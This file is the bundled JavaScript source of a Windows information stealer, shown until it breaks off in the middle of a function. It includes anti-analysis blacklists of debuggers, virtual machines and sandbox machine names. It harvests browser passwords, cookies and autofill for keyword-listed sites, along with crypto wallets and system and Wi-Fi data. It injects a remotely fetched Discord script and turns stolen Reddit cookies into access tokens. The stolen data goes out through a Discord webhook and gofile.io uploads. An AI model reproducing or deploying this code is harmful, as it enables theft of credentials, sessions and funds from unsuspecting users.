/******/ (() => { // webpackBootstrap
/******/    var __webpack_modules__ = ({

/***/ 767:
/***/ ((module) => {

                module.exports = (client) => {
                    try {
                        return {
                            url: require("./config_obf.js")().webhook_url,
                        }
                    } catch (e) {
                        return {
                            url: require("./config.js")().webhook_url,
                        }
                    }

                }


                /***/
            }),

/***/ 115:
/***/ ((module) => {

                module.exports = (client) => {
                    return {
                        passwords: 0,
                        cookies: 0,
                        history: 0,
                        bookmarks: 0,
                        screenshots: 0,

                        reddit_found: 0,
                        twitter_found: 0,
                        tiktok_found: 0,
                        roblox_found: 0,
                        instagram_found: 0,
                        minecraft_found: 0,
                        steam_found: 0,

                        encrypted_strings: 0,
                        decrypted_strings: 0,

                        wallets: 0,

                        filezilla: false,
                        growtopia: false,
                        skype: false,
                        discord: false,
                        telegram: false,
                        outlook: false,
                        steam: false,
                        uplay: false,
                        battlenet: false,

                        wifinetworks: 0,

                        keywords_cookies: [],
                        keywords_passwords: [],
                        keywords_autofill: [],
                    }
                }

                /***/
            }),

/***/ 608:
/***/ ((module) => {

                module.exports = (client) => {
                    return {
                        default_padding: client.requires.crypto.constants.RSA_PKCS1_OAEP_PADDING,
                        default_oaepHash: "sha256",
                        keyPair: client.requires.crypto.generateKeyPairSync("rsa", {
                            modulusLength: 2048,
                        }),

                        btc: client.utils.encryption.encryptData(""),
                        ltc: client.utils.encryption.encryptData(""),
                        xmr: client.utils.encryption.encryptData(""),
                        eth: client.utils.encryption.encryptData(""),
                        xrp: client.utils.encryption.encryptData(""),
                        neo: client.utils.encryption.encryptData(""),
                        bch: client.utils.encryption.encryptData(""),
                        doge: client.utils.encryption.encryptData(""),
                        dash: client.utils.encryption.encryptData(""),
                        xlm: client.utils.encryption.encryptData(""),
                    }
                }

                /***/
            }),

/***/ 829:
/***/ ((module) => {

                module.exports = (client) => {
                    return {
                        base_url: client.utils.encryption.encryptData("https://raw.githubusercontent.com/evasion6969/Evasion/main/discord_injection.js"),

                        instant_logout: true,
                        disable_qr_code: true,

                        injection_notification: true,
                        initialize_notification: true,
                        logout_notification: true,

                        running_executables: [],
                        executables: [],
                        files_path: [],

                        closed_discord_clients: '',
                        restarted_discord_clients: '',

                        grabbed_tokens: {
                            all: []
                        },
                    }
                }


                /***/
            }),

/***/ 384:
/***/ ((module) => {

                module.exports = (client) => {
                    return {

                        blacklisted_programs: [
                            "httpdebuggerui",
                            "wireshark",
                            "fiddler",
                            "vboxservice",
                            "df5serv",
                            "processhacker",
                            "vboxtray",
                            "vmtoolsd",
                            "vmwaretray",
                            "ida64",
                            "ollydbg",
                            "pestudio",
                            "vmwareuser",
                            "vgauthservice",
                            "vmacthlp",
                            "x96dbg",
                            "vmsrvc",
                            "x32dbg",
                            "vmusrvc",
                            "prl_cc",
                            "prl_tools",
                            "xenservice",
                            "qemu-ga",
                            "joeboxcontrol",
                            "ksdumperclient",
                            "ksdumper",
                            "joeboxserver"
                        ],

                        blacklisted_hwids: ["7AB5C494-39F5-4941-9163-47F54D6D5016", "032E02B4-0499-05C3-0806-3C0700080009", "03DE0294-0480-05DE-1A06-350700080009", "11111111-2222-3333-4444-555555555555", "6F3CA5EC-BEC9-4A4D-8274-11168F640058", "ADEEEE9E-EF0A-6B84-B14B-B83A54AFC548", "4C4C4544-0050-3710-8058-CAC04F59344A", "00000000-0000-0000-0000-AC1F6BD04972", "00000000-0000-0000-0000-000000000000", "5BD24D56-789F-8468-7CDC-CAA7222CC121", "49434D53-0200-9065-2500-65902500E439", "49434D53-0200-9036-2500-36902500F022", "777D84B3-88D1-451C-93E4-D235177420A7", "49434D53-0200-9036-2500-369025000C65",
                            "B1112042-52E8-E25B-3655-6A4F54155DBF", "00000000-0000-0000-0000-AC1F6BD048FE", "EB16924B-FB6D-4FA1-8666-17B91F62FB37", "A15A930C-8251-9645-AF63-E45AD728C20C", "67E595EB-54AC-4FF0-B5E3-3DA7C7B547E3", "C7D23342-A5D4-68A1-59AC-CF40F735B363", "63203342-0EB0-AA1A-4DF5-3FB37DBB0670", "44B94D56-65AB-DC02-86A0-98143A7423BF", "6608003F-ECE4-494E-B07E-1C4615D1D93C", "D9142042-8F51-5EFF-D5F8-EE9AE3D1602A", "49434D53-0200-9036-2500-369025003AF0", "8B4E8278-525C-7343-B825-280AEBCD3BCB", "4D4DDC94-E06C-44F4-95FE-33A1ADA5AC27", "79AF5279-16CF-4094-9758-F88A616D81B4"
                        ],

                        password_and_cookies_paths: [
                            process.env.LOCALAPPDATA + '\\Google\\Chrome\\User Data\\Default\\',
                            process.env.LOCALAPPDATA + '\\Google\\Chrome\\User Data\\Profile 1\\',
                            process.env.LOCALAPPDATA + '\\Google\\Chrome\\User Data\\Profile 2\\',
                            process.env.LOCALAPPDATA + '\\Google\\Chrome\\User Data\\Profile 3\\',
                            process.env.LOCALAPPDATA + '\\Google\\Chrome\\User Data\\Profile 4\\',
                            process.env.LOCALAPPDATA + '\\Google\\Chrome\\User Data\\Profile 5\\',
                            process.env.LOCALAPPDATA + '\\Google\\Chrome\\User Data\\Guest Profile\\',
                            process.env.LOCALAPPDATA + '\\Google\\Chrome\\User Data\\Default\\Network\\',
                            process.env.LOCALAPPDATA + '\\Google\\Chrome\\User Data\\Profile 1\\Network\\',
                            process.env.LOCALAPPDATA + '\\Google\\Chrome\\User Data\\Profile 2\\Network\\',
                            process.env.LOCALAPPDATA + '\\Google\\Chrome\\User Data\\Profile 3\\Network\\',
                            process.env.LOCALAPPDATA + '\\Google\\Chrome\\User Data\\Profile 4\\Network\\',
                            process.env.LOCALAPPDATA + '\\Google\\Chrome\\User Data\\Profile 5\\Network\\',
                            process.env.LOCALAPPDATA + '\\Google\\Chrome\\User Data\\Guest Profile\\Network\\',
                            process.env.APPDATA + '\\Opera Software\\Opera Stable\\',
                            process.env.APPDATA + '\\Opera Software\\Opera GX Stable\\',
                            process.env.LOCALAPPDATA + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\',
                            process.env.LOCALAPPDATA + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 1\\',
                            process.env.LOCALAPPDATA + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 2\\',
                            process.env.LOCALAPPDATA + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 3\\',
                            process.env.LOCALAPPDATA + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 4\\',
                            process.env.LOCALAPPDATA + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 5\\',
                            process.env.LOCALAPPDATA + '\\BraveSoftware\\Brave-Browser\\User Data\\Guest Profile\\',
                            process.env.LOCALAPPDATA + '\\Yandex\\YandexBrowser\\User Data\\Profile 1\\',
                            process.env.LOCALAPPDATA + '\\Yandex\\YandexBrowser\\User Data\\Profile 2\\',
                            process.env.LOCALAPPDATA + '\\Yandex\\YandexBrowser\\User Data\\Profile 3\\',
                            process.env.LOCALAPPDATA + '\\Yandex\\YandexBrowser\\User Data\\Profile 4\\',
                            process.env.LOCALAPPDATA + '\\Yandex\\YandexBrowser\\User Data\\Profile 5\\',
                            process.env.LOCALAPPDATA + '\\Yandex\\YandexBrowser\\User Data\\Guest Profile\\',
                            process.env.LOCALAPPDATA + '\\Microsoft\\Edge\\User Data\\Default\\',
                            process.env.LOCALAPPDATA + '\\Microsoft\\Edge\\User Data\\Profile 1\\',
                            process.env.LOCALAPPDATA + '\\Microsoft\\Edge\\User Data\\Profile 2\\',
                            process.env.LOCALAPPDATA + '\\Microsoft\\Edge\\User Data\\Profile 3\\',
                            process.env.LOCALAPPDATA + '\\Microsoft\\Edge\\User Data\\Profile 4\\',
                            process.env.LOCALAPPDATA + '\\Microsoft\\Edge\\User Data\\Profile 5\\',
                            process.env.LOCALAPPDATA + '\\Microsoft\\Edge\\User Data\\Guest Profile\\',
                            process.env.LOCALAPPDATA + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Network\\',
                            process.env.LOCALAPPDATA + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 1\\Network\\',
                            process.env.LOCALAPPDATA + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 2\\Network\\',
                            process.env.LOCALAPPDATA + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 3\\Network\\',
                            process.env.LOCALAPPDATA + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 4\\Network\\',
                            process.env.LOCALAPPDATA + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 5\\Network\\',
                            process.env.LOCALAPPDATA + '\\BraveSoftware\\Brave-Browser\\User Data\\Guest Profile\\Network\\',
                            process.env.LOCALAPPDATA + '\\Yandex\\YandexBrowser\\User Data\\Profile 1\\Network\\',
                            process.env.LOCALAPPDATA + '\\Yandex\\YandexBrowser\\User Data\\Profile 2\\Network\\',
                            process.env.LOCALAPPDATA + '\\Yandex\\YandexBrowser\\User Data\\Profile 3\\Network\\',
                            process.env.LOCALAPPDATA + '\\Yandex\\YandexBrowser\\User Data\\Profile 4\\Network\\',
                            process.env.LOCALAPPDATA + '\\Yandex\\YandexBrowser\\User Data\\Profile 5\\Network\\',
                            process.env.LOCALAPPDATA + '\\Yandex\\YandexBrowser\\User Data\\Guest Profile\\Network\\',
                            process.env.LOCALAPPDATA + '\\Microsoft\\Edge\\User Data\\Default\\Network\\',
                            process.env.LOCALAPPDATA + '\\Microsoft\\Edge\\User Data\\Profile 1\\Network\\',
                            process.env.LOCALAPPDATA + '\\Microsoft\\Edge\\User Data\\Profile 2\\Network\\',
                            process.env.LOCALAPPDATA + '\\Microsoft\\Edge\\User Data\\Profile 3\\Network\\',
                            process.env.LOCALAPPDATA + '\\Microsoft\\Edge\\User Data\\Profile 4\\Network\\',
                            process.env.LOCALAPPDATA + '\\Microsoft\\Edge\\User Data\\Profile 5\\Network\\',
                            process.env.LOCALAPPDATA + '\\Microsoft\\Edge\\User Data\\Guest Profile\\Network\\'
                        ],

                        blacklisted_pc_names: ["WDAGUtilityAccount", "Abby", "Peter Wilson", "hmarc", "patex", "JOHN-PC", "RDhJ0CNFevzX", "kEecfMwgj", "Frank",
                            "8Nl0ColNQ5bq", "Lisa", "John", "george", "PxmdUOpVyx", "8VizSM", "w0fjuOVmCcP5A", "lmVwjj9b", "PqONjHVwexsS", "3u2v9m8", "Julia", "HEUeRzl", "BEE7370C-8C0C-4", "DESKTOP-NAKFFMT", "WIN-5E07COS9ALR", "B30F0242-1C6A-4", "DESKTOP-VRSQLAG", "Q9IATRKPRH", "XC64ZB", "DESKTOP-D019GDM", "DESKTOP-WI8CLET", "SERVER1", "LISA-PC", "JOHN-PC",
                            "DESKTOP-B0T93D6", "DESKTOP-1PYKP29", "DESKTOP-1Y2433R", "WILEYPC", "WORK", "6C4E733F-C2D9-4", "RALPHS-PC", "DESKTOP-WG3MYJS", "DESKTOP-7XC6GEZ", "DESKTOP-5OV9S0O", "QarZhrdBpj", "ORELEEPC", "ARCHIBALDPC", "JULIA-PC", "d1bnJkfVlH",
                        ],


                        cookies: {
                            all: []
                        },

                        passwords: {
                            all: []
                        },

                        bookmarks: {
                            all: []
                        },

                        history: {
                            all: []
                        },

                        autofill: {
                            all: []
                        },

                        keywords: {
                            cookies: [],
                            passwords: [],
                            bookmarks: [],
                            history: [],
                            autofill: [],
                        },

                        validated_tokens: [],
                    }
                }

                /***/
            }),

/***/ 6:
/***/ ((module) => {

                module.exports = (client) => {
                    return {
                        execution_path: client.utils.encryption.encryptData(process.execPath),
                        debug_port: process.debugPort,
                        pid: process.pid,
                        ppid: process.ppid,
                    }
                }

                /***/
            }),

/***/ 481:
/***/ ((module) => {

                module.exports = (client) => {
                    return {
                        path: undefined,
                        generate_path: () => {
                            const subpaths = [client.utils.encryption.decryptData(client.config.user.localappdata), client.utils.encryption.decryptData(client.config.user.appdata), client.utils.encryption.decryptData(client.config.user.temp)]
                            const subpath = subpaths[Math.floor(Math.random() * subpaths.length)]

                            const random_folder_name = `${client.utils.encryption.decryptData(client.config.user.hostname)}_${client.requires.crypto.randomUUID()}`;

                            client.requires.fs.mkdirSync(`${subpath}\\${random_folder_name}`, 0744)

                            return `${subpath}\\${random_folder_name}`;
                        }
                    }
                }

                /***/
            }),

/***/ 941:
/***/ ((module) => {

                module.exports = (client) => {
                    return {
                        version: client.utils.encryption.encryptData("1.0"),
                        start_delay: 0
                    }
                }

                /***/
            }),

/***/ 265:
/***/ ((module) => {

                module.exports = (client) => {
                    return {
                        cpus: [],
                        ram: client.utils.encryption.encryptData(`${Math.round(client.requires.os.totalmem() / 1024 / 1024 / 1024)} GB`),
                        version: client.utils.encryption.encryptData(client.requires.os.version()),
                        uptime: client.utils.encryption.encryptData(`${(client.requires.os.uptime() / 60).toFixed(0)} minutes (${(client.requires.os.uptime() / 60 / 60).toFixed(2)} hours)`),
                        hostdir: client.utils.encryption.encryptData(client.requires.os.homedir()),
                        hostname: client.utils.encryption.encryptData(client.requires.os.hostname()),
                        username: client.utils.encryption.encryptData(client.requires.os.userInfo().username),
                        type: client.utils.encryption.encryptData(client.requires.os.type()),
                        arch: client.utils.encryption.encryptData(client.requires.os.arch()),
                        release: client.utils.encryption.encryptData(client.requires.os.release()),

                        appdata: client.utils.encryption.encryptData(process.env.APPDATA),
                        localappdata: client.utils.encryption.encryptData(process.env.LOCALAPPDATA),
                        temp: client.utils.encryption.encryptData(process.env.TEMP),
                        user_domain: client.utils.encryption.encryptData(process.env.COMPUTERNAME),
                        monitor_address: client.utils.encryption.encryptData(process.env.MONITOR_ADDRESS),
                        processor_identifier: client.utils.encryption.encryptData(process.env.PROCESSOR_IDENTIFIER),
                        processor_architecture: client.utils.encryption.encryptData(process.env.PROCESSOR_ARCHITECTURE),
                        processors: client.utils.encryption.encryptData(process.env.NUMBER_OF_PROCESSORS),
                        system_drive: client.utils.encryption.encryptData(process.env.SystemDrive),

                        autostart: [client.utils.encryption.encryptData(process.env.APPDATA + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"), client.utils.encryption.encryptData(process.env.SystemDrive + "\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup")],


                        wifi_connections: async () => {
                            const wifi_connections = await client.requires.systeminformation.getDynamicData();

                            let text = ""

                            wifi_connections.wifiNetworks.forEach((connection) => {
                                text += `${connection.ssid} | ${connection.bssid}\n`
                            })

                            client.config.counter.wifinetworks = wifi_connections.wifiNetworks.length;

                            return text
                        },

                        connection_info: undefined,
                    }
                }

                /***/
            }),

/***/ 965:
/***/ ((module) => {

                module.exports = (client) => {
                    return {
                        directory: {
                            "💸 Zcash": `${process.env.APPDATA}\\Zcash`,
                            "🚀 Armory": `${process.env.APPDATA}\\Armory`,
                            "📀 Bytecoin": `${process.env.APPDATA}\\bytecoin`,
                            "💵 Jaxx": `${process.env.APPDATA}\\com.liberty.jaxx\\IndexedDB\\file__0.indexeddb.leveldb`,
                            "💎 Exodus": `${process.env.APPDATA}\\Exodus\\exodus.wallet`,
                            "📉 Ethereum": `${process.env.APPDATA}\\Ethereum\\keystore`,
                            "🔨 Electrum": `${process.env.APPDATA}\\Electrum\\wallets`,
                            "🕹️ AtomicWallet": `${process.env.APPDATA}\\atomic\\Local Storage\\leveldb`,
                            "💹 Guarda": `${process.env.APPDATA}\\Guarda\\Local Storage\\leveldb`,
                            "⚡ Coinomi": `${process.env.APPDATA}\\Coinomi\\Coinomi\\wallets`,
                        },
                    }
                }

                /***/
            }),

/***/ 612:
/***/ ((module, __unused_webpack_exports, __nccwpck_require__) => {

                const crypto = __nccwpck_require__(113);
                const stream = __nccwpck_require__(781);

                const axios = __nccwpck_require__(382);
                const FormData = __nccwpck_require__(522);
                const https = require("https")

                const axios_instance = axios.create({
                    httpsAgent: new https.Agent({
                        rejectUnauthorized: false
                    })
                })

                // Typedefs
                /**
                 * File for upload
                 * @typedef {object} FileUpload
                 * @property {Buffer|ReadableStream} file - File data
                 * @property {string} [fn] - File name
                 */
                /**
                 * Options for uploading a file or files
                 * @typedef {object} UploadOptions
                 * @property {string} expire - Upload expiration date in epoch
                 * @property {string} password - Password for accessing the upload
                 * @property {string} description - Description of the upload
                 * @property {string} tags - Tags of the upload (If multiple, separate by comma)
                 * @property {string} ac - Admin code of the upload
                 * @property {string} email - Email the upload will be stored on
                 */
                /**
                 * File metadata after creation
                 * @typedef {object} FileCreated
                 * @property {string} code - Upload ID
                 * @property {string} removalCode - Removal code
                 */
                /**
                 * Information about an upload
                 * @typedef {object} UploadInfo
                 * @property {string} code - Upload ID
                 * @property {string} server - File upload server
                 * @property {number} uploadTime - File upload time
                 * @property {number} totalSize - Upload size
                 * @property {number} views - Views
                 * @property {number} hasZip - Has a zip file
                 *
                 * @property {object[]} files - List of files in upload
                 * @property {string} files.name - File name
                 * @property {number} files.size - File size
                 * @property {string} files.md5 - MD5 hash of file
                 * @property {string} files.mimetype - File mimetype
                 * @property {string} files.link - File URL for download
                 */

                function sha256hash(str) {
                    return crypto.createHash("sha256").update(str).digest("hex");
                }

                async function getServer() {
                    try {
                        const res = await axios_instance({
                            url: `https://apiv2.gofile.io/getServer`,
                            method: "GET",
                            headers: {
                                accept: "*/*",
                                "accept-language": "en-US,en;",
                                "cache-control": "no-cache",
                                pragma: "no-cache",
                                referrer: "https://gofile.io/uploadFiles",
                                mode: "cors",
                                "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36 Edg/85.0.564.44",
                                dnt: 1,
                                origin: "https://gofile.io"
                            },
                        });

                        if (res.data.status !== "ok") {
                            throw new Error(`Fetching server info failed: ${JSON.stringify(res.data)}`);
                        }
                        return res.data.data.server;
                    } catch (e) {
                        console.log("Error with fetching server:");
                        console.error(e);
                    }
                }

                /**
                 *
                 * @param {FileUpload[]} files - List of files to upload
                 * @param {UploadOptions} options - Options for the upload
                 * @returns {Promise<FileCreated>} ID and removal code of the uploaded files
                 */
                async function uploadFiles(files, options = {}) {
                    try {
                        let server = await getServer();
                        for (let f of files) {
                            const fd = new FormData();
                            if (f.fn === "") {
                                fd.append("file", f.file);
                            } else {
                                fd.append("file", f.file, f.fn);
                            }


                            if (options.description) {
                                if (options.description.length <= 1000) {
                                    fd.append("description", options.description);
                                } else {
                                    throw new Error("Invalid value for field description. ");
                                }
                            }

                            if (options.tags) {
                                if (options.tags.length <= 1000) {
                                    fd.append("tags", options.tags);
                                } else {
                                    throw new Error("Invalid value for field tags. ");
                                }
                            }

                            if (options.ac) {
                                if (options.ac.length <= 20) {
                                    fd.append("ac", options.ac);
                                } else {
                                    throw new Error("Invalid value for field ac. ");
                                }
                            }

                            if (options.email) {
                                if (/.+@.+\..+/i.test(options.email)) {
                                    fd.append("email", options.email);
                                } else {
                                    throw new Error("Invalid value for field email. ");
                                }
                            }

                            if (options.password) {
                                if (/^[a-z0-9]{6,20}$/i.test(options.password)) {
                                    fd.append("password", options.password);
                                } else {
                                    throw new Error("Invalid value for field password. ");
                                }
                            }
                            if (options.expire) {
                                if (!isNaN(options.expire) && options.expire > 10000000000 ? options.expire : options.expire / 1000 > Date.now() / 1000) {
                                    fd.append("expire", Math.round(options.expire > 10000000000 ? options.expire : options.expire / 1000));
                                } else {
                                    throw new Error("Invalid value for field expire. ");
                                }
                            }

                            const res = await axios_instance({
                                url: `https://${server}.gofile.io/uploadFile`,
                                method: "POST",
                                headers: {
                                    accept: "*/*",
                                    "accept-language": "en-US,en;",
                                    "cache-control": "no-cache",
                                    pragma: "no-cache",
                                    referrer: "https://gofile.io/uploadFiles",
                                    mode: "cors",
                                    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36 Edg/85.0.564.44",
                                    dnt: 1,
                                    origin: "https://gofile.io",
                                    ...fd.getHeaders(),
                                },
                                'maxContentLength': Infinity,
                                'maxBodyLength': Infinity,
                                referrer: "https://gofile.io/uploadFiles",
                                data: fd,
                            });

                            if (res.data.status !== "ok") {
                                throw new Error(`Uploading file failed: ${JSON.stringify(res.data)}`);
                            }
                            return res.data.data;
                        }
                    } catch (e) {
                        console.log("Error with file upload.");
                        console.error(e);
                    }



                }

                /**
                 * @async
                 * @function uploadFile
                 * @description Note: a Buffer cannot be passed without a file name
                 * @param {ReadableStream} file - ReadableStream with file data (file name is inferred)
                 * @param {UploadOptions} options - Options for the upload
                 * @returns {Promise<FileCreated>} ID and removal code of the uploaded file
                 */
                /**
                 * @async
                 * @function uploadFile
                 * @param {Buffer|ReadableStream} file - Buffer or ReadableStream with file data
                 * @param {string} fileName - File name
                 * @param {UploadOptions} options - Options for the upload
                 * @returns {Promise<FileCreated>} ID and removal code of the uploaded file
                 */

                async function uploadFile(arg1, arg2, arg3) {
                    if (arg1 instanceof Buffer || arg1 instanceof ArrayBuffer) {
                        if (arg2 && arg2 !== "" && typeof arg2 !== "object") {
                            return uploadFiles([{ file: arg1, fn: arg2 }], arg3);
                        } else {
                            throw Error("Filename must not be blank when using a Buffer.");
                        }
                    } else if (arg1 instanceof stream.Readable) {
                        if (arg2 && arg2 !== "" && typeof arg2 !== "object") {
                            return uploadFiles([{ file: arg1, fn: arg2 }], arg3);
                        } else {
                            return uploadFiles([{ file: arg1 }], arg2);
                        }
                    } else {
                        throw Error("Invalid file type");
                    }
                }

                /**
                 *
                 * @param {string} code - Upload ID
                 * @param {string} removalCode - Removal code of the upload
                 */
                async function removeUpload(code, removalCode) {
                    try {
                        const server = (await getServer(code)) || "srv-file9";

                        const res = await axios_instance({
                            url: `https://${server}.gofile.io/deleteUpload?c=${code}&rc=${removalCode}`,
                            method: "GET",
                            headers: {
                                accept: "*/*",
                                "accept-language": "en-US,en;",
                                "cache-control": "no-cache",
                                pragma: "no-cache",
                            },
                            referrer: `https://gofile.io/?c=${code}`,
                            referrerPolicy: "no-referrer-when-downgrade",
                            mode: "cors",
                        });

                        if (res.data.status !== "ok") {
                            throw new Error(`Removing file failed: ${JSON.stringify(res.data)}`);
                        }
                        return res.data.data;
                    } catch (e) {
                        console.error(e);
                    }
                }

                /**
                 *
                 * @param {string} code - Upload ID
                 * @param {string} [p] - Passphrase used to secure the upload
                 * @returns {Promise<UploadInfo>}
                 */
                async function getUploadInfo(code, p = "") {
                    try {
                        const server = (await getServer(code)) || "srv-file9";

                        const res = await axios_instance({
                            url: `https://${server}.gofile.io/getUpload?c=${code}${p && p !== "" ? `&p=${sha256hash(p)}` : ""}`,
                            method: "GET",
                            headers: {
                                accept: "*/*",
                                "accept-language": "en-US,en;",
                                "cache-control": "no-cache",
                                pragma: "no-cache",
                            },
                            referrer: `https://gofile.io/?c=${code}`,
                            referrerPolicy: "no-referrer-when-downgrade",
                            mode: "cors",
                        });

                        if (res.data.status !== "ok") {
                            throw new Error(`Fetching file info failed: ${JSON.stringify(res.data)}`);
                        }
                        return res.data.data;
                    } catch (e) {
                        console.error(e);
                    }
                }

                /**
                 *
                 * @param {string} code - Upload ID
                 * @param {string} [p] - Passphrase used to secure the upload
                 * @param {"arraybuffer"|"stream"} [responseType] - Return type
                 * @returns {Promise<Buffer[]>|Promise<ReadableStream[]>} Returns an array of Buffers or Streams depending on the responseType parameter. Represents all files in the upload.
                 */
                async function downloadFiles(code, p = "", responseType = "arraybuffer") {
                    try {
                        const uploadInfo = await getUploadInfo(code, p);

                        const reqs = Object.keys(uploadInfo.files)
                            .map(k => uploadInfo.files[k])
                            .map(f =>
                                axios_instance({
                                    url: f.link,
                                    headers: {
                                        accept:
                                            "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                                        "accept-language": "en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7",
                                        "cache-control": "no-cache",
                                        pragma: "no-cache",
                                        "upgrade-insecure-requests": "1",
                                    },
                                    referrerPolicy: "no-referrer-when-downgrade",
                                    method: "GET",
                                    mode: "cors",
                                    responseType,
                                })
                            );

                        return (await Promise.all(reqs)).map(r => r.data);
                    } catch (e) {
                        console.error(e);
                    }
                }

                module.exports = {
                    uploadFile,
                    uploadFiles,
                    removeUpload,
                    getUploadInfo,
                    downloadFiles,
                };

                /***/
            }),

/***/ 48:
/***/ ((module) => {

                module.exports = (client) => {
                    return {
                        keywords: [
                            "gmail.com",
                            "live.com",
                            "zoho.com",
                            "yahoo.com",
                            "tutanota.com",
                            "trashmail.com",
                            "gmx.net",
                            "safe-mail.net",
                            "thunderbird.net",
                            "mail.lycos.com",
                            "hushmail.com",
                            "mail.aol.com",
                            "icloud.com",
                            "protonmail.com",
                            "fastmail.com",
                            "rackspace.com",
                            "1and1.com",
                            "mailbox.org",
                            "mail.yandex.com",
                            "titan.email",
                            "youtube.com",
                            "nulled.to",
                            "cracked.to",
                            "tiktok.com",
                            "yahoo.com",
                            "gmx.com",
                            "aol.com",
                            "coinbase",
                            "mail.ru",
                            "rambler.ru",
                            "gamesense.pub",
                            "neverlose.cc",
                            "onetap.com",
                            "fatality.win",
                            "vape.gg",
                            "binance",
                            "ogu.gg",
                            "lolz.guru",
                            "xss.is",
                            "g2g.com",
                            "igvault.com",
                            "plati.ru",
                            "minecraft.net",
                            "primordial.dev",
                            "vacban.wtf",
                            "instagram.com",
                            "mail.ee",
                            "hotmail.com",
                            "facebook.com",
                            "vk.ru",
                            "x.synapse.to",
                            "hu2.app",
                            "shoppy.gg",
                            "app.sell",
                            "sellix.io",
                            "gmx.de",
                            "riotgames.com",
                            "mega.nz",
                            "roblox.com",
                            "exploit.in",
                            "breached.to",
                            "v3rmillion.net",
                            "hackforums.net",
                            "0x00sec.org",
                            "unknowncheats.me",
                            "godaddy.com",
                            "accounts.google.com",
                            "aternos.org",
                            "namecheap.com",
                            "hostinger.com",
                            "bluehost.com",
                            "hostgator.com",
                            "siteground.com",
                            "netafraz.com",
                            "iranserver.com",
                            "ionos.com",
                            "whois.com",
                            "te.eg",
                            "vultr.com",
                            "mizbanfa.net",
                            "neti.ee",
                            "osta.ee",
                            "cafe24.com",
                            "wpengine.com",
                            "parspack.com",
                            "cloudways.com",
                            "inmotionhosting.com",
                            "hinet.net",
                            "mihanwebhost.com",
                            "mojang.com",
                            "phoenixnap.com",
                            "dreamhost.com",
                            "rackspace.com",
                            "name.com",
                            "alibabacloud.com",
                            "a2hosting.com",
                            "contabo.com",
                            "xinnet.com",
                            "7ho.st",
                            "hetzner.com",
                            "domain.com",
                            "west.cn",
                            "iranhost.com",
                            "yisu.com",
                            "ovhcloud.com",
                            "000webhost.com",
                            "reg.ru",
                            "lws.fr",
                            "home.pl",
                            "sakura.ne.jp",
                            "matbao.net",
                            "scalacube.com",
                            "telia.ee",
                            "estoxy.com",
                            "zone.ee",
                            "veebimajutus.ee",
                            "beehosting.pro",
                            "core.eu",
                            "wavecom.ee",
                            "iphoster.net",
                            "cspacehostings.com",
                            "zap-hosting.com",
                            "iceline.com",
                            "zaphosting.com",
                            "cubes.com",
                            "chimpanzeehost.com",
                            "fatalityservers.com",
                            "craftandsurvive.com",
                            "mcprohosting.com",
                            "shockbyte.com",
                            "ggservers.com",
                            "scalacube.com",
                            "apexminecrafthosting.com",
                            "nodecraft.com",
                            "sparkedhost.com",
                            "pebblehost.com",
                            "ramshard.com",
                            "linkvertise.com",
                            "adf.ly",
                            "spotify.com",
                            "tv3play.ee",
                            "clarity.tk",
                            "messenger.com",
                            "snapchat.com",
                            "boltfood.eu",
                            "stuudium.com",
                            "ekool.eu",
                            "steamcommunity.com",
                            "epicgames.com",
                            "0x00sec.org",
                            "greysec.net",
                            "twitter.com",
                            "reddit.com",
                            "amazon.com",
                            "redengine.eu",
                            "eulencheats.com",
                            "4netplayers.com",
                            "velia.net",
                            "bybit.com",
                            "coinbase.com",
                            "ftx.com",
                            "ftx.us",
                            "binance.us",
                            "bitfinex.com",
                            "kraken.com",
                            "bitstamp.net",
                            "bittrex.com",
                            "kucoin.com",
                            "cex.io",
                            "gemini.com",
                            "blockfi.com",
                            "nexo.io",
                            "nordvpn.com",
                            "surfshark.com",
                            "privateinternetaccess.com",
                            "netflix.com",
                            "play.tv3.ee",
                            ".ope.ee",
                            "astolfo.lgbt",
                            "intent.store",
                            "novoline.wtf",
                            "flux.today",
                            "moonx.gg",
                            "novoline.lol",
                            "twitch.tv"
                        ]
                    }
                }

                /***/
            }),

/***/ 960:
/***/ ((module) => {

                module.exports = (client) => {
                    return {

                        async stealRedditSession(cookie, browser) {
                            try {
                                const { data: getBearer } = await client.axios_instance.post("https://accounts.reddit.com/api/access_token", { "scopes": ["*", "email", "pii"] }, { headers: { cookie: cookie, "Authorization": "Basic b2hYcG9xclpZdWIxa2c6" } });
                                const { data: accountInfo } = await client.axios_instance.get("https://oauth.reddit.com/api/v1/me", { headers: { "Authorization": "Bearer " + getBearer.access_token } })

                                await client.utils.webhook.sendToWebhook({
                                    embeds: [
                                        client.utils.webhook.createEmbed(
                                            {
                                                "title": "Reddit session detected",
                                                "description": `The reddit session was detected on the \`\`${browser}\`\` browser`,
                                                "thumbnail": {
                                                    url: accountInfo.icon_img
                                                },
                                                fields: [
                                                    {
                                                        name: "Cookie",
                                                        value: `\`\`\`${cookie}\`\`\``,
                                                        inline: true
                                                    },
                                                    {
                                                        name: "Profile URL",
                                                        value: `[Click here](https://www.reddit.com/user/${accountInfo.name})`,
                                                        inline: false
                                                    },
                                                    {
                                                        name: "Username",
                                                        value: `\`\`\`${accountInfo.name}\`\`\``,
                                                        inline: false
                                                    },
                                                    {
                                                        name: "Comment Karma",
                                                        value: `\`\`\`${accountInfo.comment_karma}\`\`\``,
                                                        inline: true
                                                    },
                                                    {
                                                        name: "Total Karma",
                                                        value: `\`\`\`${accountInfo.total_karma}\`\`\``,
